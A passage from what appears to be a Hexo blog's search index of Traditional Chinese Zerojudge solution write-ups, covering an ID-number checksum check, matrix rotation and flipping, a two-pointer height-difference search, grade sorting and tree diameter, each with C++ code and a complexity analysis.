class="string">"-"</span>)&#123;</span><br><span class="line">					nums.push(a-b);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(res.front() == <span class="string">"*"</span>)&#123;</span><br><span class="line">					nums.push(a*b);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(res.front() == <span class="string">"/"</span>)&#123;</span><br><span class="line">					nums.push(a/b);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					nums.push(a%b);</span><br><span class="line">				&#125;</span><br><span class="line">				res.pop();</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				nums.push(string_to_num(res.front()));</span><br><span class="line">				res.pop();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;nums.top()&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">		nums.pop();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>轉成後序運算式的複雜度為 $O(len(input))$</p>
<p>計算的時間複雜度也約為 $O(len(input))$</p>
<p>整體複雜度為 $O(2len(input))$ ，約為 $O(len(input))$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
      </categories>
      <tags>
        <tag>資料結構</tag>
        <tag>Zerojudge</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge a020</title>
    <url>/2021/03/23/Zerojudge%20a020/</url>
    <content><![CDATA[<h1 id="ZJ-a020"><a href="#ZJ-a020" class="headerlink" title="ZJ a020"></a>ZJ a020</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=a020" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=a020</a></p>
<p>給一個身分證字號，求是否符合身份證字號的規則，其規則如下:</p>
<ol>
<li>先依照表格，將英文字母對應到數字 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A&#x3D;10 台北市     J&#x3D;18 新竹縣     S&#x3D;26 高雄縣</span><br><span class="line">B&#x3D;11 台中市     K&#x3D;19 苗栗縣     T&#x3D;27 屏東縣</span><br><span class="line">C&#x3D;12 基隆市     L&#x3D;20 台中縣     U&#x3D;28 花蓮縣</span><br><span class="line">D&#x3D;13 台南市     M&#x3D;21 南投縣     V&#x3D;29 台東縣</span><br><span class="line">E&#x3D;14 高雄市     N&#x3D;22 彰化縣     W&#x3D;32 金門縣</span><br><span class="line">F&#x3D;15 台北縣     O&#x3D;35 新竹市     X&#x3D;30 澎湖縣</span><br><span class="line">G&#x3D;16 宜蘭縣     P&#x3D;23 雲林縣     Y&#x3D;31 陽明山</span><br><span class="line">H&#x3D;17 桃園縣     Q&#x3D;24 嘉義縣     Z&#x3D;33 連江縣</span><br><span class="line">I&#x3D;34 嘉義市     R&#x3D;25 台南縣</span><br></pre></td></tr></table></figure></li>
<li>將第 1 步得到的數字的<strong>十位數</strong>以及<strong>個位數乘上 9</strong> 的值記錄下來為 $n$</li>
<li>數字從最左邊到最右邊依序乘上 8, 7, 6, … ,2, 1 ，並相加記錄下來為 $m$</li>
<li>若 $n+m$ 是 10 的倍數，表示正確，否則錯誤</li>
</ol>
<p>若是正確的身分證輸出 <code>real</code> ， 否則輸出 <code>fake</code></p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>建立一個對照的表格(這裡以 function 實現)，讓英文字能對應到相對的數字</p>
<p>接著做第 2 步驟，再判斷即可</p>
<p>建表稍微麻煩，但是只要用心就可以完成了</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"><span class="keyword">int</span> cnt=<span class="number">0</span>,tmp;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_num</span><span class="params">(<span class="keyword">char</span> c)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(c&gt;=<span class="string">'A'</span>&amp;&amp;c&lt;=<span class="string">'H'</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">10</span>+(c-<span class="string">'A'</span>);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(c==<span class="string">'I'</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">34</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(c&gt;=<span class="string">'J'</span> &amp;&amp; c&lt;=<span class="string">'N'</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">18</span>+(c-<span class="string">'J'</span>);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(c==<span class="string">'O'</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">35</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(c&gt;=<span class="string">'P'</span> &amp;&amp; c&lt;=<span class="string">'V'</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">23</span>+(c-<span class="string">'P'</span>);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(c==<span class="string">'W'</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">32</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(c==<span class="string">'X'</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">30</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(c==<span class="string">'Y'</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">31</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(c==<span class="string">'Z'</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">33</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">	tmp=get_num(s[<span class="number">0</span>]);</span><br><span class="line">	cnt+=(tmp/<span class="number">10</span>)+(tmp%<span class="number">10</span>)*<span class="number">9</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>, T=<span class="number">8</span> ; i&lt;s.size() ; i++,T--)&#123;</span><br><span class="line">		<span class="keyword">if</span>(T==<span class="number">0</span>)</span><br><span class="line">			cnt+=s[i]-<span class="string">'0'</span>;</span><br><span class="line">		cnt+=(s[i]-<span class="string">'0'</span>)*T;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(cnt%<span class="number">10</span>==<span class="number">0</span>)</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"real\n"</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"fake\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>由於字串的長度很小，並且每次計算的量值也很小，直接以 $O(1)$ 記之</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge b266</title>
    <url>/2021/03/23/Zerojudge%20b266/</url>
    <content><![CDATA[<h1 id="Zerojudge-b266"><a href="#Zerojudge-b266" class="headerlink" title="Zerojudge b266"></a>Zerojudge b266</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=b266" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=b266</a></p>
<p>給一個經過幾個操作的矩陣，求原本矩陣的長寬以及該矩陣</p>
<p>可行的操作包括</p>
<ul>
<li>翻轉<br>  <img src="https://i.imgur.com/0hKaQkJ.png" alt=""></li>
<li>旋轉<br>  <img src="https://i.imgur.com/1xjUnEG.png" alt=""></li>
</ul>
<p>特別注意到，他要的是原本的矩陣所以所有操作都要反過來做</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> r,c,m,arr[<span class="number">15</span>][<span class="number">15</span>],op[<span class="number">15</span>];</span><br><span class="line"><span class="keyword">bool</span> out=<span class="literal">false</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rotate</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tmp[<span class="number">15</span>][<span class="number">15</span>];</span><br><span class="line">    swap(r,c);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;r ; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;c ; j++)&#123;</span><br><span class="line">            tmp[i][j] = arr[j][r-i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    swap(arr,tmp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mirror</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tmp[<span class="number">15</span>][<span class="number">15</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> arr_x=r<span class="number">-1</span>, tmp_x=<span class="number">0</span> ; arr_x&gt;=<span class="number">0</span> ; arr_x--, tmp_x++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;c ; j++)&#123;</span><br><span class="line">            tmp[tmp_x][j] = arr[arr_x][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    swap(arr,tmp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;r&gt;&gt;c&gt;&gt;m)&#123;</span><br><span class="line">        <span class="keyword">if</span>(out)&#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            out=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;r ; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;c ; j++)&#123;</span><br><span class="line">                <span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;m ; i++)&#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;op[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=m<span class="number">-1</span> ; i&gt;=<span class="number">0</span> ; i--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(op[i]==<span class="number">0</span>)&#123;</span><br><span class="line">                rotate();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                mirror();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;r&lt;&lt;<span class="string">" "</span>&lt;&lt;c&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;r ; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;c ; j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(j) <span class="built_in">cout</span>&lt;&lt;<span class="string">' '</span>;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;arr[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>輸入時間複雜度為 $O(rc+m)$</p>
<p>翻轉與旋轉的時間複雜度皆為 $O(rc)$</p>
<p>每筆測資的時間複雜度為 $O(rc+m+mrc)$ 約為 $O(mrc)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge b542</title>
    <url>/2020/09/25/Zerojudge%20b542/</url>
    <content><![CDATA[<h1 id="Zerojudge-a007"><a href="#Zerojudge-a007" class="headerlink" title="Zerojudge a007"></a>Zerojudge a007</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=b542" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=b542</a><br>有一群人各有一個身高，求任兩人間身高差為 $k$ 的情況是否存在</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>先將身高進行排序<br>那麼每次只須要維護序列的左界與右界，判斷兩者的高度差<br>如果大於 $k$ 就表示左界要再提升<br>如果小於 $k$ 就表示右界要再提升<br>查詢直到差值為 $k$ 即得解</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,q,k,arr[<span class="number">100010</span>];</span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span> ; i&lt;n &amp;&amp; j&lt;n ; )&#123;</span><br><span class="line">		<span class="keyword">int</span> calc=<span class="built_in">abs</span>(arr[i]-arr[j]);</span><br><span class="line">		<span class="keyword">if</span>(calc == k)</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"YES"</span>;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(calc &lt; k)</span><br><span class="line">				j++;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				i++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">"NO"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;q;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">	sort(arr,arr+n);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;q ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;k;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;solve()&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>輸入時間複雜度為 $O(n)$ </br><br>每筆輸入的處理時間複雜度為 $O(n)$ </br><br>總時間複雜度約為 $O(n)$ </br></p>
]]></content>
      <categories>
        <category>Zerojudge</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>Slide Window</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge b964</title>
    <url>/2020/06/27/Zerojudge%20b694/</url>
    <content><![CDATA[<h1 id="Zerojudge-b694"><a href="#Zerojudge-b694" class="headerlink" title="Zerojudge b694"></a>Zerojudge b694</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=b964" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=b964</a><br>給定 $n$ 個成績，求成績排序後結果、不及格中最高分、及格中最低分</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>排序可以直接用STL sort解決<br>其他可以拿兩個變數紀錄即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,arr[<span class="number">1000</span>],lucky=<span class="number">999</span>,unlucky=<span class="number">-1</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">		<span class="keyword">if</span>(arr[i]&gt;=<span class="number">60</span>)</span><br><span class="line">			lucky = min(lucky,arr[i]);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			unlucky = max(unlucky,arr[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	sort(arr,arr+n);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(i)</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;arr[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">if</span>(unlucky == <span class="number">-1</span>)</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"best case\n"</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;unlucky&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">if</span>(lucky==<span class="number">999</span>)</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"worst case\n"</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;lucky&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>找尋lucky number及unlucky number複雜度為 $O(n)$<br>sort複雜度為 $O(nlogn)$<br>總複雜度 $O(n+nlogn)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge b965</title>
    <url>/2020/06/27/Zerojudge%20b965/</url>
    <content><![CDATA[<h1 id="Zerojudge-b965"><a href="#Zerojudge-b965" class="headerlink" title="Zerojudge b965"></a>Zerojudge b965</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=b965" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=b965</a><br>給定一個矩陣經過多次 旋轉/翻轉 後的樣子，求原矩陣</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>將操作反著做回來即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> r,c,m,arr[<span class="number">10</span>][<span class="number">10</span>],tmp[<span class="number">10</span>][<span class="number">10</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cycle</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">memset</span>(tmp,<span class="number">0</span>,<span class="keyword">sizeof</span>(tmp));</span><br><span class="line">	swap(r,c);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;r ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;c ; j++)&#123;</span><br><span class="line">			tmp[i][j] = arr[j][r-i<span class="number">-1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	swap(arr,tmp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">flip</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=r<span class="number">-1</span>,j=<span class="number">0</span> ; i&gt;j ; i--,j++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span> ; k&lt;c ; k++)&#123;</span><br><span class="line">			swap(arr[i][k],arr[j][k]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_arr</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;r ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;c ; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(j)</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">' '</span>;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;arr[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;r&gt;&gt;c&gt;&gt;m)&#123;</span><br><span class="line">		<span class="built_in">memset</span>(arr,<span class="number">0</span>,<span class="keyword">sizeof</span>(arr));</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;r ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;c ; j++)&#123;</span><br><span class="line">				<span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; s;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,tmp ; i&lt;m ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;tmp;</span><br><span class="line">			s.push(tmp);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">while</span>(!s.empty())&#123;</span><br><span class="line">			<span class="keyword">int</span> now=s.top();</span><br><span class="line">			<span class="keyword">if</span>(now==<span class="number">0</span>)</span><br><span class="line">				cycle();</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				flip();</span><br><span class="line">			s.pop();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;r&lt;&lt;<span class="string">" "</span>&lt;&lt;c&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		print_arr();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>翻轉複雜度為 $O(rc)$<br>旋轉複雜度為 $O(rc)$<br>單筆測資複雜度為 $O(mrc)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge b967</title>
    <url>/2020/06/27/Zerojudge%20b967/</url>
    <content><![CDATA[<h1 id="Zerojudge-b967"><a href="#Zerojudge-b967" class="headerlink" title="Zerojudge b967"></a>Zerojudge b967</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=b967" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=b967</a><br>相當於求樹直徑</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>可以證明透過兩次DFS即可求解<br>證明過程可參閱 <a href="https://www.itread01.com/content/1549861926.html" target="_blank" rel="noopener">https://www.itread01.com/content/1549861926.html</a></p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">pii far;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v[<span class="number">100005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> last,<span class="keyword">int</span> depth)</span></span>&#123;</span><br><span class="line">	far = max(far,&#123;depth,now&#125;);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">auto</span> i: v[now])&#123;</span><br><span class="line">		<span class="keyword">if</span>(i==last)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		dfs(i,now,depth+<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span 